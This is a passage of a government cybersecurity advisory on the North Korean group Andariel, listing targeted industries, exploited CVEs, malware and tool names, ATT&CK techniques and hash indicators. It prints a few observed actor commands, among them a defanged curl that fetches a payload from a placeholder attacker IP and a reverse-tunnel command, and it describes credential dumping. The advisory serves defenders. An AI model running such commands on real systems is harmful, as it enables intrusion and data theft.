<p>The RGB 3<sup>rd</sup> Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as <a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a>, <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a> (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa. The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3<sup>rd</sup> Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.</p>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.&nbsp;</p>
<p>The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.</p>
<p>The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:</p>
<p>For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/north-korea\" title=\"North Korea Cyber Threat Overview and Advisories\">North Korea Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs</a>
    <span class=\"c-file__size\">(PDF,       804.21 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       836.55 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of associated indicators of compromise (IOCs), see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX XML</a>
    <span class=\"c-file__size\">(XML,       296.99 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A-North-Korea-Cyber-Group-Conducts-Global-Espionage-Campaign-to-Advance-Regimes-Military-and-Nuclear-Programs.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       140.84 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<h3>RGB 3<sup>rd</sup> Bureau</h3>
<p><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a> (also known as <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a>, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.</p>
<h4><strong>Cyber Espionage</strong></h4>
<p>The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Andariel Cyber Espionage Victimology</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Industry&nbsp;</th>
<th role=\"columnheader\">Information Targeted</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Defense</strong></td>
<td>
<ul>
<li>Heavy and light tanks and self-propelled howitzers</li>
<li>Light strike vehicles and ammunition supply vehicles</li>
<li>Littoral combat ships and combatant craft</li>
<li>Submarines, torpedoes, unmanned underwater vehicles (UUVs), and autonomous underwater vehicles (AUVs)</li>
<li>Modeling and simulation services</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Aerospace</strong></td>
<td>
<ul>
<li>Fighter aircraft and unmanned aerial vehicles (UAVs)</li>
<li>Missiles and missile defense systems</li>
<li>Satellites, satellite communications, and nano-satellite technology</li>
<li>Surveillance radar, phased-array radar, and other radar systems</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Nuclear</strong></td>
<td>
<ul>
<li>Uranium processing and enrichment</li>
<li>Material waste and storage</li>
<li>Nuclear power plants</li>
<li>Government nuclear facilities and research institutes</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Engineering</strong></td>
<td>
<ul>
<li>Shipbuilding and marine engineering</li>
<li>Robot machinery and mechanical arms</li>
<li>Additive manufacturing and 3D printing components and technology</li>
<li>Casting, fabrication, high-heat metal molding, and rubber and plastic molding</li>
<li>Machining processes and technology</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs.</p>
<h4><strong>Ransomware</strong></h4>
<p>Andariel actors fund their espionage activity through ransomware operations against U.S. healthcare entities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware and cyber espionage against the same entity. For more information on this ransomware activity, see joint advisories <a href=\"https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3293960/us-south-korean-agencies-partner-to-stopransomware-threat-from-dprk/\" title=\"#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities\">#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-187a\" title=\" North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector\">North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector</a>.</p>
<h3>Malicious Cyber Espionage Activity</h3>
<p>This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the Appendix: MITRE ATT&amp;CK Techniques for all referenced tactics and techniques.</p>
<h4><strong>Reconnaissance and Enumeration</strong></h4>
<p>While there is limited available information on the group’s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a>]. The actors gather open source information about their victims for use in targeting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information\">T1591</a>] and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>]. CVEs researched include:</p>
<ul>
<li>CVE-2023-46604 – Apache ActiveMQ</li>
<li>CVE-2023-42793 – TeamCity&nbsp;</li>
<li>CVE-2023-3519 – Citrix NetScaler</li>
<li>CVE-2023-35078 – Ivanti Endpoint Manager Mobile (EPMM)&nbsp;</li>
<li>CVE-2023-34362 – MOVEIt&nbsp;</li>
<li>CVE-2023-33246 – RocketMQ&nbsp;</li>
<li>CVE-2023-32784 – KeePass&nbsp;</li>
<li>CVE-2023-32315 – Openfire&nbsp;</li>
<li>CVE-2023-3079 – Google Chromium V8 Type Confusion</li>
<li>CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware</li>
<li>CVE-2023-2868 – Barracuda Email Security Gateway</li>
<li>CVE-2023-27997 – FortiGate SSL VPN&nbsp;</li>
<li>CVE-2023-25690 – Apache HTTP Server</li>
<li>CVE-2023-21932 – Oracle Hospitality Opera 5</li>
<li>CVE-2023-0669 – GoAnywhere MFT</li>
<li>CVE-2022-47966 – ManageEngine&nbsp;</li>
<li>CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite</li>
<li>CVE-2022-30190 – Microsoft Windows Support Diagnostic Tool</li>
<li>CVE-2022-25064 – TP-LINK<s>&nbsp;</s></li>
<li>CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS</li>
<li>CVE-2022-24785 – Moment.js&nbsp;</li>
<li>CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere&nbsp;</li>
<li>CVE-2022-22965 – Spring4Shell</li>
<li>CVE-2022-22947 – Spring Cloud Gateway&nbsp;</li>
<li>CVE-2022-22005 – Microsoft SharePoint Server&nbsp;</li>
<li>CVE-2022-21882 – Win32k Elevation of Privilege&nbsp;</li>
<li>CVE-2021-44228 – Apache Log4j&nbsp;</li>
<li>CVE-2021-44142 – Samba vfs_fruit module&nbsp;</li>
<li>CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities</li>
<li>CVE-2021-41773 – Apache HTTP Server 2.4.49</li>
<li>CVE-2021-40684 – Talend ESB Runtime&nbsp;</li>
<li>CVE-2021-3018 – IPeakCMS 3.5&nbsp;</li>
<li>CVE-2021-20038 – SMA100 Apache httpd server (SonicWall)&nbsp;</li>
<li>CVE-2021-20028 – SonicWall Secure Remote Access (SRA)&nbsp;</li>
<li>CVE-2019-15637 – Tableau&nbsp;</li>
<li>CVE-2019-7609 – Kibana</li>
<li>CVE-2019-0708 – Microsoft Remote Desktop Services&nbsp;</li>
<li>CVE-2017-4946 – VMware V4H and V4PA</li>
</ul>
<h4><strong>Resource Development, Tooling, and Remote Access Tools</strong></h4>
<p>The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.</p>
<ul>
<li>Atharvan</li>
<li>ELF Backdoor</li>
<li>Jupiter</li>
<li>MagicRAT</li>
<li>“No Pineapple”</li>
<li>TigerRAT</li>
<li>Valefor/VSingle</li>
<li>ValidAlpha</li>
<li>YamaBot</li>
<li>NukeSped</li>
<li>Goat RAT</li>
<li>Black RAT</li>
<li>AndarLoader</li>
<li>DurianBeacon</li>
<li>Trifaux</li>
<li>KaosRAT</li>
<li>Preft</li>
<li>Andariel Scheduled Task Malware</li>
<li>BottomLoader (see Cisco Talos blog Operation Blacksmith)</li>
<li>NineRAT (see Cisco Talos blog Operation Blacksmith)</li>
<li>DLang (see Cisco Talos blog Operation Blacksmith)</li>
<li>Nestdoor (see AhnLab blog)</li>
</ul>
<p>These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a>]. The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.</p>
<h4><strong>Commodity Malware and Dual-Use Applications</strong></h4>
<p>Commodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. Dual-use applications are software tools widely available for purchase or use that are commonly utilized by administrators and users for system administration or other legitimate purposes and also by threat actors for malicious activities. These dual-use applications may reside locally, known as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use of publicly available malware and dual-use applications.&nbsp;The use of publicly available malware &nbsp;and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success obfuscating their identities by&nbsp;leveraging open source malware. The authoring agencies have identified the following open-source and dual-use&nbsp;tools as used and/or customized by the actors:</p>
<ul>
<li>3Proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>AdFind [<a href=\"https://attack.mitre.org/versions/v15/software/S0552/\" title=\"AdFind\">S0552</a>]</li>
<li>AsyncRAT</li>
<li>DeimosC2</li>
<li>Impacket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Juggernaut [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1040\" title=\"Network Sniffing\">T1040</a>]</li>
<li>Lilith RAT</li>
<li>ORVX Web Shell</li>
<li>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</li>
<li>PLINK [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>ProcDump [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]</li>
<li>PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>SOCKS5 [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Stunnel [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]&nbsp;</li>
<li>Web Shell by Orb (WSO)</li>
<li>WinRAR [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>]</li>
<li>WinSCP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]</li>
<li>RDP Wrapper [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
</ul>
<h4><strong>Initial Access</strong></h4>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<h4><strong>Execution</strong></h4>
<p>The actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer <code>netstat</code> commands, such as <code>netstat –naop</code> and <code>netstat –noa</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a>]. Example commands used by the actors include the following:</p>
<ul>
<li><code>netstat –naop&nbsp;</code></li>
<li><code>netstat –noa</code></li>
<li><code>pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] &lt;Remote_IP&gt;</code></li>
<li><code>curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe</code></li>
<li><code>C:\\windows\\system32\\cmd.exe /c systeminfo | findstr Logon</code></li>
</ul>
<p>These actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>The actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as <code>vmp0</code> and <code>vmp1</code> for VMProtect and Themida or randomized file section names for Themida [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<h4><strong>Credential Access</strong></h4>
<p>The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting of the <code>NTDS.dit</code> file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the <code>vssadmin</code> command-line utility to back up a volume to retrieve a copy of the <code>NTDS.dit</code> file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>].</p>
<h4><strong>Discovery</strong></h4>
<p>The actors used customized file system enumeration tooling written in .NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a>].&nbsp;</p>
<p>The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>].</p>
<h4><strong>Lateral Movement</strong></h4>
<p>The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the <code>%Temp%</code> directory.</p>
<p>The actors have also used Remote Desktop Protocol (RDP) to move laterally [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\">T1021</a>].</p>
<h4><strong>Command and Control</strong></h4>
<p>The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a>].</p>
<h4><strong>Collection and Exfiltration</strong></h4>
<p>Malware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a>].</p>
<p>The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a>]. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>].</p>
<p>The actors have also been identified staging files for exfiltration on victim machines, establishing Remote Desktop Protocol connections, and conducting <code>HTTP GET</code> requests on port <code>80</code> to receive information [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a>].</p>
<h2><strong>Indicators of Compromise</strong></h2>
<p>See below for Andariel IOCs.</p>
<p>The following include observed MD5 hashes:</p>
<ul>
<li>88a7c84ac7f7ed310b5ee791ec8bd6c5</li>
<li>6ab4eb4c23c9e419fbba85884ea141f4</li>
<li>97ce00c7ef1f7d98b48291d73d900181</li>
<li>079b4588eaa99a1e802adf5e0b26d8aa</li>
<li>0873b5744d8ab6e3fe7c9754cf7761a3</li>
<li>0d696d27bae69a62def82e308d28857a</li>
<li>0ecf4bac2b070cf40f0b17e18ce312e6</li>
<li>17c46ed7b80c2e4dbea6d0e88ea0827c</li>
<li>1f2410c3c25dadf9e0943cd634558800</li>
<li>2968c20a07cfc97a167aa3dd54124cda</li>
<li>33e85d0f3ef2020cdb0fc3c8d80e8e69</li>
<li>4118d9adce7350c3eedeb056a3335346</li>
<li>4aa57e1c66c2e01f2da3f106ed2303fa</li>
<li>58ad3103295afcc22bde8d81e77c282f</li>
<li>5c41cbf8a7620e10f158f6b70963d1cb</li>
<li>61a949553d35f31957db6442f36730c5</li>
<li>72a22afde3f820422cfdbba7a4cbabde</li>
<li>84bd45e223b018e67e4662c057f2c47e</li>
<li>86465d92f0d690b62866f52f5283b9fc</li>
<li>8b395cc6ecdec0900facf6e93ec48fbb</li>
<li>97f352e2808c78eef9b31c758ca13032</li>
<li>a50f3b7aa11b977ae89285b60968aa67</li>
<li>afd25ce56b9808c5ed7eade75d2e12a7</li>
<li>afdeb24975a318fc5f20d9e61422a308</li>
<li>b697b81b341692a0b137b2c748310ea7</li>
<li>bcac28919fa33704a01d7a9e5e3ddf3f</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>c892c60817e6399f939987bd2bf5dee0</li>
<li>cdeae978f3293f4e783761bc61b34810</li>
<li>d0f310c99476f1712ac082f78dd29fdc</li>
<li>d8da33fae924b991b776797ba8cde24c</li>
<li>e230c5728f9ea5a94e390e7da7bf1ffa</li>
<li>f4d46629ca15313b94992f3798718df7</li>
<li>fb84a392601fc19aeb7f8ce11b3a4907</li>
<li>ff3194d3d5810a42858f3e22c91500b1</li>
<li>13b4ce1fc26d400d34ede460a8530d93</li>
<li>41895c5416fdc82f7e0babc6bb6c7216</li>
<li>c2f8c9bb7df688d0a7030a96314bb493</li>
<li>33a3da2de78418b89a603e28a1e8852c</li>
<li>4896da30a745079cd6265b6332886d45</li>
<li>73eb2f4f101aab6158c615094f7a632a</li>
<li>7f33d2d2a2ce9c195202acb59de31eee</li>
<li>e1afd01400ef405e46091e8ef10c721c</li>
<li>fe25c192875ec1914b8880ea3896cda2</li>
<li>232586f8cfe82b80fd0dfa6ed8795c56</li>
<li>c1f266f7ec886278f030e7d7cd4e9131</li>
<li>49bb2ad67a8c5dfbfe8db2169e6fa46e</li>
<li>beb199b15bd075996fa8d6a0ed554ca8</li>
<li>4053ca3e37ed1f8d37b29eed61c2e729</li>
<li>3a0c8ae783116c1840740417c4fbe678</li>
<li>0414a2ab718d44bf6f7103cff287b312</li>
<li>ca564428a29faf1a613f35d9fa36313f</li>
<li>ad6d4eb34d29e350f96dc8df6d8a092e</li>
<li>dc70dc9845aa747001ebf2a02467c203</li>
<li>3d2ec58f37c8176e0dbcc47ff93e5a76</li>
<li>0a09b7f2317b3d5f057180be6b6d0755</li>
<li>1ffccc23fef2964e9b1747098c19d956</li>
<li>9112efb49cae021abebd3e9a564e6ca4</li>
<li>ac0ada011f1544aa3a1cf27a26f2e288</li>
<li>0211a3160cc5871cbcd4e5514449162b</li>
<li>7416ea48102e2715c87edd49ddbd1526</li>
<li>a2aefb7ab6c644aa8eeb482e27b2dbc4</li>
<li>e7fd7f48fbf5635a04e302af50dfb651</li>
<li>33b2b5b7c830c34c688cf6ced287e5be</li>
<li>e5410abaaac69c88db84ab3d0e9485ac</li>
<li>eb35b75369805e7a6371577b1d2c4531</li>
<li>5a3f3f75048b9cec177838fb8b40b945</li>
<li>9d7bd0caed10cc002670faff7ca130f5</li>
<li>8434cdd34425916be234b19f933ad7ea</li>
<li>bbaee4fe73ccff1097d635422fdc0483</li>
<li>79e474e056b4798e0a3e7c60dd67fd28</li>
<li>95c276215dcc1bd7606c0cb2be06bf70</li>
<li>426bb55531e8e3055c942a1a035e46b9</li>
<li>cfae52529468034dbbb40c9a985fa504</li>
<li>deae4be61c90ad6d499f5bdac5dad242</li>
<li>bda0686d02a8b7685adf937cbcd35f46</li>
<li>6de6c27ca8f4e00f0b3e8ff5185a59d1</li>
<li>c61a8c4f6f6870c7ca0013e084b893d2</li>
<li>5291aed100cc48415636c4875592f70c</li>
<li>f4795f7aec4389c8323f7f40b50ae46f</li>
<li>cf1a90e458966bcba8286d46d6ab052c</li>
<li>792370eb01e16ac3dc511143932d0e1d</li>
<li>612538328e0c4f3e445fb58ef811336a</li>
<li>9767aa592ec2d6ae3c7d40b6049d0466</li>
<li>b22fd0604c4f189f2b7a59c8f48882dd</li>
<li>e53ca714787a86c13f07942a56d64efa</li>
<li>c7b09f1dd0a5694de677f3ecceda41b7</li>
<li>c8346b39418f92725719f364068a218d</li>
<li>730bff14e80ffd7737a97cdf11362ab5</li>
<li>9a481bc83fea1dea3e3bdfff5e154d44</li>
<li>ddb1f970371fa32faae61fc5b8423d4b</li>
<li>6c2b947921e7c77d9af62ce9a3ed7621</li>
<li>977d30b261f64cc582b48960909d0a89</li>
<li>7ce51b56a6b0f8f78056ddfc5b5de67c</li>
<li>dd9625be4a1201c6dfb205c12cf3a381</li>
<li>ecb4a09618e2aba77ea37bd011d7d7f7</li>
<li>0fd8c6f56c52c21c061a94e5765b27b4</li>
<li>c90d094a8fbeaa8a0083c7372bfc1897</li>
<li>0055a266aa536b2fdadb3336ef8d4fba</li>
<li>55bb271bbbf19108fec73d224c9b4218</li>
<li>0c046a2f5304ed8d768795a49b99d6e4</li>
<li>f34664e0d9a10974da117c1ca859dba8</li>
<li>a2c2099d503fcc29478205f5aef0283b</li>
<li>e439f850aa8ead560c99a8d93e472225</li>
<li>7c30ed6a612a1fd252565300c03c7523</li>
<li>81738405a7783c09906da5c7212e606b</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>eb7ba9f7424dffdb7d695b00007a3c6d</li>
<li>3e9ee5982e3054dc76d3ba5cc88ae3de</li>
<li>073e3170a8e7537ff985ec8316319351</li>
<li>9b0e7c460a80f740d455a7521f0eada1</li>
<li>2d02f5499d35a8dffb4c8bc0b7fec5c2</li>
<li>0984954526232f7d05910aa5b07c5893</li>
<li>4156a7283284ece739e1bae05f99e17c</li>
<li>3026d419ee140f3c6acd5bff54132795</li>
<li>7aa132c0cc63a38fb4d1789553266fc7</li>
<li>1a0811472fad0ff507a92c957542fffd</li>
<li>f8aef59d0c5afe8df31e11a1984fbc0a</li>
<li>82491b42b9a2d34b13137e36784a67d7</li>
<li>0a199944f757d5615164e8808a3c712a</li>
<li>9c97ea18da290a6833a1d36e2d419efc</li>
<li>16f768eac33f79775a9672018e0d64f5</li>
</ul>
<div class=\"WordSection1\">
<p>The following include observed SHA-256 hashes:</p>
<ul>
<li>ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>773760fd71d52457ba53a314f15dddb1a74e8b2f5a90e5e150dea48a21aa76df</li>
<li>05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d</li>
<li>e3027062e602c5d1812c039739e2f93fc78341a67b77692567a4690935123abe</li>
<li>1962ebb7bf8d2b306c6f3b55c3dcd69a755eeff1a17577b7606894b781841c3a</li>
<li>f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb</li>
<li>6db57bbc2d07343dd6ceba0f53c73756af78f09fe1cb5ce8e8008e5e7242eae1</li>
<li>b7435d23769e79fcbe69b28df4aef062685d1a631892c2354f96d833eae467be</li>
<li>66415464a0795d0569efa5cb5664785f74ed0b92a593280d689f3a2ac68dca66</li>
<li>def2f01fbd4be85f48101e5ab7ddd82efb720e67daa6838f30fd8dcda1977563</li>
<li>323cbe7a3d050230cfaa822c2a22160b4f8c5fe65481dd329841ee2754b522d9</li>
<li>74529dd15d1953a47f0d7ecc2916b2b92865274a106e453a24943ca9ee434643</li>
<li>1e4de822695570421eb2f12fdfe1d32ab8639655e12180a7ab3cf429e7811b8f</li>
<li>8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5</li>
<li>c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f</li>
<li>dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469</li>
<li>90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4</li>
